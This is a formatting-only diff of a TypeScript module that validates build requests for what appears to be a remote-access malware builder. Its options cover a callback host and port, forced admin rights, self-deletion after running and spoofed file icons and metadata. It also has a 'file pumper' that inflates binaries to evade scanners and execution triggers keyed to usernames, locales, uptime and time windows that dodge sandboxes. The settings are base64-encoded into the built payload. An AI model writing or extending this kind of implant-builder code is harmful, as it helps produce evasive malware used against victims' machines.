@@ -44,13 +44,13 @@ const maxFilePumperBytes = 10 * 1024 * 1024 * 1024; // 10 GiB
 export type NormalizedWatchdog = { enabled: true; intervalSeconds: number } | null;
 export type NormalizedFilePumper = { enabled: true; targetBytes: number } | null;
 export type NormalizedExecutionTriggers = {
-        delaySeconds?: number;
-        minUptimeMinutes?: number;
-        allowedUsernames?: string[];
-        allowedLocales?: string[];
-        requireInternet: boolean;
-        startTime?: string;
-        endTime?: string;
+	delaySeconds?: number;
+	minUptimeMinutes?: number;
+	allowedUsernames?: string[];
+	allowedLocales?: string[];
+	requireInternet: boolean;
+	startTime?: string;
+	endTime?: string;
 } | null;
 
 export type NormalizedCustomHeader = { key: string; value: string };
@@ -220,10 +220,10 @@ export function parseVersionParts(value: string | undefined): VersionParts | nul
 }
 
 export type NormalizedBuildRequest = {
-        host: string;
-        port: string;
-        targetOS: TargetOS;
-        targetArch: TargetArch;
+	host: string;
+	port: string;
+	targetOS: TargetOS;
+	targetArch: TargetArch;
 	outputExtension: string;
 	outputFilename: string;
 	installationPath: string;
@@ -235,32 +235,32 @@ export type NormalizedBuildRequest = {
 	forceAdmin: boolean;
 	pollIntervalMs: string | null;
 	maxBackoffMs: string | null;
-        shellTimeoutSeconds: string | null;
-        fileIcon: BuildRequest['fileIcon'] | null | undefined;
-        fileInformation: BuildRequest['fileInformation'] | null | undefined;
-        audio: { streaming: NormalizedAudioStreaming };
-        watchdog: NormalizedWatchdog;
-        filePumper: NormalizedFilePumper;
-        executionTriggers: NormalizedExecutionTriggers;
-        customHeaders: NormalizedCustomHeader[];
-        customCookies: NormalizedCustomCookie[];
-        raw: BuildRequest;
+	shellTimeoutSeconds: string | null;
+	fileIcon: BuildRequest['fileIcon'] | null | undefined;
+	fileInformation: BuildRequest['fileInformation'] | null | undefined;
+	audio: { streaming: NormalizedAudioStreaming };
+	watchdog: NormalizedWatchdog;
+	filePumper: NormalizedFilePumper;
+	executionTriggers: NormalizedExecutionTriggers;
+	customHeaders: NormalizedCustomHeader[];
+	customCookies: NormalizedCustomCookie[];
+	raw: BuildRequest;
 };
 
 export type NormalizedRuntimeConfig = {
-        watchdog?: { intervalSeconds: number };
-        filePumper?: { targetBytes: number };
-        executionTriggers?: {
-                delaySeconds?: number;
-                minUptimeMinutes?: number;
-                allowedUsernames?: string[];
-                allowedLocales?: string[];
-                requireInternet: boolean;
-                startTime?: string;
-                endTime?: string;
-        };
-        customHeaders?: NormalizedCustomHeader[];
-        customCookies?: NormalizedCustomCookie[];
+	watchdog?: { intervalSeconds: number };
+	filePumper?: { targetBytes: number };
+	executionTriggers?: {
+		delaySeconds?: number;
+		minUptimeMinutes?: number;
+		allowedUsernames?: string[];
+		allowedLocales?: string[];
+		requireInternet: boolean;
+		startTime?: string;
+		endTime?: string;
+	};
+	customHeaders?: NormalizedCustomHeader[];
+	customCookies?: NormalizedCustomCookie[];
 } | null;
 
 function formatZodError(err: ZodError): string {
@@ -292,16 +292,16 @@ export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequ
 		throw error(400, 'Host cannot contain whitespace');
 	}
 
-        let port = parsed.port !== undefined ? parsed.port.toString().trim() : '2332';
-        if (!/^\d+$/.test(port)) {
-                throw error(400, 'Port must be numeric');
-        }
+	let port = parsed.port !== undefined ? parsed.port.toString().trim() : '2332';
+	if (!/^\d+$/.test(port)) {
+		throw error(400, 'Port must be numeric');
+	}
 
-        const numericPort = Number.parseInt(port, 10);
-        if (numericPort < 1 || numericPort > 65535) {
-                throw error(400, 'Port must be between 1 and 65535');
-        }
-        port = String(numericPort);
+	const numericPort = Number.parseInt(port, 10);
+	if (numericPort < 1 || numericPort > 65535) {
+		throw error(400, 'Port must be between 1 and 65535');
+	}
+	port = String(numericPort);
 
 	const targetOS = resolveTargetOS(parsed.targetOS);
 	const targetArch = resolveTargetArch(parsed.targetArch, targetOS);
@@ -337,18 +337,18 @@ export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequ
 		'Shell timeout'
 	);
 
-        const watchdog = sanitizeWatchdog(parsed.watchdog ?? null);
-        const filePumper = sanitizeFilePumper(parsed.filePumper ?? null);
-        const executionTriggers = sanitizeExecutionTriggers(parsed.executionTriggers ?? null);
-        const customHeaders = sanitizeCustomHeaders(parsed.customHeaders ?? null);
-        const customCookies = sanitizeCustomCookies(parsed.customCookies ?? null);
+	const watchdog = sanitizeWatchdog(parsed.watchdog ?? null);
+	const filePumper = sanitizeFilePumper(parsed.filePumper ?? null);
+	const executionTriggers = sanitizeExecutionTriggers(parsed.executionTriggers ?? null);
+	const customHeaders = sanitizeCustomHeaders(parsed.customHeaders ?? null);
+	const customCookies = sanitizeCustomCookies(parsed.customCookies ?? null);
 
-        return {
-                host,
-                port,
-                targetOS,
-                targetArch,
-                outputExtension,
+	return {
+		host,
+		port,
+		targetOS,
+		targetArch,
+		outputExtension,
 		outputFilename,
 		installationPath,
 		meltAfterRun,
@@ -359,217 +359,238 @@ export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequ
 		forceAdmin,
 		pollIntervalMs,
 		maxBackoffMs,
-                shellTimeoutSeconds,
-                fileIcon: parsed.fileIcon ?? null,
-                fileInformation: parsed.fileInformation ?? null,
-                audio: { streaming: normalizeAudioStreaming(parsed.audio) },
-                watchdog,
-                filePumper,
-                executionTriggers,
-                customHeaders,
-                customCookies,
-                raw: parsed
-        } satisfies NormalizedBuildRequest;
+		shellTimeoutSeconds,
+		fileIcon: parsed.fileIcon ?? null,
+		fileInformation: parsed.fileInformation ?? null,
+		audio: { streaming: normalizeAudioStreaming(parsed.audio) },
+		watchdog,
+		filePumper,
+		executionTriggers,
+		customHeaders,
+		customCookies,
+		raw: parsed
+	} satisfies NormalizedBuildRequest;
 }
 
 function clamp(value: number, min: number, max: number): number {
-        return Math.min(Math.max(value, min), max);
+	return Math.min(Math.max(value, min), max);
 }
 
-export function sanitizeWatchdog(payload: BuildRequest['watchdog'] | null | undefined): NormalizedWatchdog {
-        if (!payload || !payload.enabled) {
-                return null;
-        }
-        const interval = clamp(Math.round(payload.intervalSeconds), minWatchdogIntervalSeconds, maxWatchdogIntervalSeconds);
-        return { enabled: true, intervalSeconds: interval };
+export function sanitizeWatchdog(
+	payload: BuildRequest['watchdog'] | null | undefined
+): NormalizedWatchdog {
+	if (!payload || !payload.enabled) {
+		return null;
+	}
+	const interval = clamp(
+		Math.round(payload.intervalSeconds),
+		minWatchdogIntervalSeconds,
+		maxWatchdogIntervalSeconds
+	);
+	return { enabled: true, intervalSeconds: interval };
 }
 
-export function sanitizeFilePumper(payload: BuildRequest['filePumper'] | null | undefined): NormalizedFilePumper {
-        if (!payload || !payload.enabled) {
-                return null;
-        }
-        const sanitizedTarget = Math.min(Math.max(Math.round(payload.targetBytes), 1), maxFilePumperBytes);
-        return { enabled: true, targetBytes: sanitizedTarget };
+export function sanitizeFilePumper(
+	payload: BuildRequest['filePumper'] | null | undefined
+): NormalizedFilePumper {
+	if (!payload || !payload.enabled) {
+		return null;
+	}
+	const sanitizedTarget = Math.min(
+		Math.max(Math.round(payload.targetBytes), 1),
+		maxFilePumperBytes
+	);
+	return { enabled: true, targetBytes: sanitizedTarget };
 }
 
 function sanitizeStringArray(values: unknown): string[] {
-        if (!Array.isArray(values)) {
-                return [];
-        }
-        const normalized: string[] = [];
-        for (const value of values) {
-                if (typeof value !== 'string') {
-                        continue;
-                }
-                const trimmed = value.trim();
-                if (!trimmed) {
-                        continue;
-                }
-                if (!normalized.includes(trimmed)) {
-                        normalized.push(trimmed);
-                }
-        }
-        return normalized.slice(0, 32);
+	if (!Array.isArray(values)) {
+		return [];
+	}
+	const normalized: string[] = [];
+	for (const value of values) {
+		if (typeof value !== 'string') {
+			continue;
+		}
+		const trimmed = value.trim();
+		if (!trimmed) {
+			continue;
+		}
+		if (!normalized.includes(trimmed)) {
+			normalized.push(trimmed);
+		}
+	}
+	return normalized.slice(0, 32);
 }
 
 function normalizeIsoTimestamp(value: unknown): string | undefined {
-        if (typeof value !== 'string') {
-                return undefined;
-        }
-        const trimmed = value.trim();
-        if (!trimmed) {
-                return undefined;
-        }
-        const parsed = new Date(trimmed);
-        if (Number.isNaN(parsed.getTime())) {
-                return undefined;
-        }
-        return parsed.toISOString();
+	if (typeof value !== 'string') {
+		return undefined;
+	}
+	const trimmed = value.trim();
+	if (!trimmed) {
+		return undefined;
+	}
+	const parsed = new Date(trimmed);
+	if (Number.isNaN(parsed.getTime())) {
+		return undefined;
+	}
+	return parsed.toISOString();
 }
 
 export function sanitizeExecutionTriggers(
-        payload: BuildRequest['executionTriggers'] | null | undefined
+	payload: BuildRequest['executionTriggers'] | null | undefined
 ): NormalizedExecutionTriggers {
-        if (!payload) {
-                return null;
-        }
+	if (!payload) {
+		return null;
+	}
 
-        const normalized: NonNullable<NormalizedExecutionTriggers> = {
-                requireInternet: payload.requireInternet !== false
-        };
+	const normalized: NonNullable<NormalizedExecutionTriggers> = {
+		requireInternet: payload.requireInternet !== false
+	};
 
-        if (typeof payload.delaySeconds === 'number' && Number.isFinite(payload.delaySeconds) && payload.delaySeconds > 0) {
-                normalized.delaySeconds = clamp(Math.round(payload.delaySeconds), 0, 86_400);
-        }
+	if (
+		typeof payload.delaySeconds === 'number' &&
+		Number.isFinite(payload.delaySeconds) &&
+		payload.delaySeconds > 0
+	) {
+		normalized.delaySeconds = clamp(Math.round(payload.delaySeconds), 0, 86_400);
+	}
 
-        if (
-                typeof payload.minUptimeMinutes === 'number' &&
-                Number.isFinite(payload.minUptimeMinutes) &&
-                payload.minUptimeMinutes > 0
-        ) {
-                normalized.minUptimeMinutes = clamp(Math.round(payload.minUptimeMinutes), 0, 10_080);
-        }
+	if (
+		typeof payload.minUptimeMinutes === 'number' &&
+		Number.isFinite(payload.minUptimeMinutes) &&
+		payload.minUptimeMinutes > 0
+	) {
+		normalized.minUptimeMinutes = clamp(Math.round(payload.minUptimeMinutes), 0, 10_080);
+	}
 
-        const usernames = sanitizeStringArray(payload.allowedUsernames);
-        if (usernames.length > 0) {
-                normalized.allowedUsernames = usernames;
-        }
+	const usernames = sanitizeStringArray(payload.allowedUsernames);
+	if (usernames.length > 0) {
+		normalized.allowedUsernames = usernames;
+	}
 
-        const locales = sanitizeStringArray(payload.allowedLocales).map((value) => value.toLowerCase());
-        if (locales.length > 0) {
-                normalized.allowedLocales = locales;
-        }
+	const locales = sanitizeStringArray(payload.allowedLocales).map((value) => value.toLowerCase());
+	if (locales.length > 0) {
+		normalized.allowedLocales = locales;
+	}
 
-        const startTime = normalizeIsoTimestamp(payload.startTime);
-        if (startTime) {
-                normalized.startTime = startTime;
-        }
+	const startTime = normalizeIsoTimestamp(payload.startTime);
+	if (startTime) {
+		normalized.startTime = startTime;
+	}
 
-        const endTime = normalizeIsoTimestamp(payload.endTime);
-        if (endTime) {
-                normalized.endTime = endTime;
-        }
+	const endTime = normalizeIsoTimestamp(payload.endTime);
+	if (endTime) {
+		normalized.endTime = endTime;
+	}
 
-        const hasExtraKeys =
-                normalized.delaySeconds !== undefined ||
-                normalized.minUptimeMinutes !== undefined ||
-                normalized.allowedUsernames !== undefined ||
-                normalized.allowedLocales !== undefined ||
-                normalized.startTime !== undefined ||
-                normalized.endTime !== undefined ||
-                normalized.requireInternet === false;
+	const hasExtraKeys =
+		normalized.delaySeconds !== undefined ||
+		normalized.minUptimeMinutes !== undefined ||
+		normalized.allowedUsernames !== undefined ||
+		normalized.allowedLocales !== undefined ||
+		normalized.startTime !== undefined ||
+		normalized.endTime !== undefined ||
+		normalized.requireInternet === false;
 
-        if (!hasExtraKeys) {
-                return null;
-        }
+	if (!hasExtraKeys) {
+		return null;
+	}
 
-        return normalized;
+	return normalized;
 }
 
 function sanitizeHeaderValue(value: unknown): string | null {
-        if (typeof value !== 'string') {
-                return null;
-        }
-        const trimmed = value.trim();
-        if (!trimmed) {
-                return null;
-        }
-        return trimmed.slice(0, 256);
+	if (typeof value !== 'string') {
+		return null;
+	}
+	const trimmed = value.trim();
+	if (!trimmed) {
+		return null;
+	}
+	return trimmed.slice(0, 256);
 }
 
-export function sanitizeCustomHeaders(payload: BuildRequest['customHeaders'] | null | undefined): NormalizedCustomHeader[] {
-        if (!Array.isArray(payload) || payload.length === 0) {
-                return [];
-        }
-        const normalized: NormalizedCustomHeader[] = [];
-        for (const header of payload) {
-                if (!header || typeof header !== 'object') {
-                        continue;
-                }
-                const key = sanitizeHeaderValue((header as BuildRequest['customHeaders'][number]).key);
-                const value = sanitizeHeaderValue((header as BuildRequest['customHeaders'][number]).value);
-                if (!key || !value) {
-                        continue;
-                }
-                normalized.push({ key, value });
-                if (normalized.length >= 32) {
-                        break;
-                }
-        }
-        return normalized;
+export function sanitizeCustomHeaders(
+	payload: BuildRequest['customHeaders'] | null | undefined
+): NormalizedCustomHeader[] {
+	if (!Array.isArray(payload) || payload.length === 0) {
+		return [];
+	}
+	const normalized: NormalizedCustomHeader[] = [];
+	for (const header of payload) {
+		if (!header || typeof header !== 'object') {
+			continue;
+		}
+		const key = sanitizeHeaderValue((header as BuildRequest['customHeaders'][number]).key);
+		const value = sanitizeHeaderValue((header as BuildRequest['customHeaders'][number]).value);
+		if (!key || !value) {
+			continue;
+		}
+		normalized.push({ key, value });
+		if (normalized.length >= 32) {
+			break;
+		}
+	}
+	return normalized;
 }
 
-export function sanitizeCustomCookies(payload: BuildRequest['customCookies'] | null | undefined): NormalizedCustomCookie[] {
-        if (!Array.isArray(payload) || payload.length === 0) {
-                return [];
-        }
-        const normalized: NormalizedCustomCookie[] = [];
-        for (const cookie of payload) {
-                if (!cookie || typeof cookie !== 'object') {
-                        continue;
-                }
-                const name = sanitizeHeaderValue((cookie as BuildRequest['customCookies'][number]).name);
-                const value = sanitizeHeaderValue((cookie as BuildRequest['customCookies'][number]).value);
-                if (!name || !value) {
-                        continue;
-                }
-                normalized.push({ name, value });
-                if (normalized.length >= 32) {
-                        break;
-                }
-        }
-        return normalized;
+export function sanitizeCustomCookies(
+	payload: BuildRequest['customCookies'] | null | undefined
+): NormalizedCustomCookie[] {
+	if (!Array.isArray(payload) || payload.length === 0) {
+		return [];
+	}
+	const normalized: NormalizedCustomCookie[] = [];
+	for (const cookie of payload) {
+		if (!cookie || typeof cookie !== 'object') {
+			continue;
+		}
+		const name = sanitizeHeaderValue((cookie as BuildRequest['customCookies'][number]).name);
+		const value = sanitizeHeaderValue((cookie as BuildRequest['customCookies'][number]).value);
+		if (!name || !value) {
+			continue;
+		}
+		normalized.push({ name, value });
+		if (normalized.length >= 32) {
+			break;
+		}
+	}
+	return normalized;
 }
 
-export function buildRuntimeConfigPayload(normalized: NormalizedBuildRequest): NormalizedRuntimeConfig {
-        const payload: NonNullable<NormalizedRuntimeConfig> = {};
+export function buildRuntimeConfigPayload(
+	normalized: NormalizedBuildRequest
+): NormalizedRuntimeConfig {
+	const payload: NonNullable<NormalizedRuntimeConfig> = {};
 
-        if (normalized.watchdog) {
-                payload.watchdog = { intervalSeconds: normalized.watchdog.intervalSeconds };
-        }
-        if (normalized.filePumper) {
-                payload.filePumper = { targetBytes: normalized.filePumper.targetBytes };
-        }
-        if (normalized.executionTriggers) {
-                payload.executionTriggers = normalized.executionTriggers;
-        }
-        if (normalized.customHeaders.length > 0) {
-                payload.customHeaders = normalized.customHeaders;
-        }
-        if (normalized.customCookies.length > 0) {
-                payload.customCookies = normalized.customCookies;
-        }
+	if (normalized.watchdog) {
+		payload.watchdog = { intervalSeconds: normalized.watchdog.intervalSeconds };
+	}
+	if (normalized.filePumper) {
+		payload.filePumper = { targetBytes: normalized.filePumper.targetBytes };
+	}
+	if (normalized.executionTriggers) {
+		payload.executionTriggers = normalized.executionTriggers;
+	}
+	if (normalized.customHeaders.length > 0) {
+		payload.customHeaders = normalized.customHeaders;
+	}
+	if (normalized.customCookies.length > 0) {
+		payload.customCookies = normalized.customCookies;
+	}
 
-        if (Object.keys(payload).length === 0) {
-                return null;
-        }
-        return payload;
+	if (Object.keys(payload).length === 0) {
+		return null;
+	}
+	return payload;
 }
 
 export function encodeRuntimeConfig(normalized: NormalizedBuildRequest): string | null {
-        const payload = buildRuntimeConfigPayload(normalized);
-        if (!payload) {
-                return null;
-        }
-        return Buffer.from(JSON.stringify(payload), 'utf8').toString('base64');
+	const payload = buildRuntimeConfigPayload(normalized);
+	if (!payload) {
+		return null;
+	}
+	return Buffer.from(JSON.stringify(payload), 'utf8').toString('base64');
 }
